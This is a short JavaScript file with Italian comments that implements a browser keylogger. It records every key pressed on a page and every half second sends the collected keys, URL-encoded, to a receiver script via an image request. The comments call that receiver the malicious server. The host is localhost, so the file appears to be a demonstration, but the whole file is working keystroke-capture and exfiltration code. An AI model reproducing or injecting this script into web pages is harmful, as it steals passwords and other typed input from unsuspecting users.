function init(){
  // Registra tutti i tasti premuti
  var pressed = [];
  window.addEventListener("keydown", function(evt){
    pressed.push(evt.key);
  });

  // Inviando i dati al server ogni .5s
  window.setInterval(function () {
    if (pressed.length>5) {
      var data = encodeURIComponent(JSON.stringify(pressed)); // per spedire dati a server remoti bisogna codificare e rendere "stringhe gli oggetti o array"
      // console.log(data);
      new Image().src = "http://localhost/keyloggerReceiver.php?k=" + data; // Invia i dati creando un nuovo oggetto immagine che punta come src il server malevolo
      pressed = [];
    }
  }, 500);
}

$(document).ready(init);
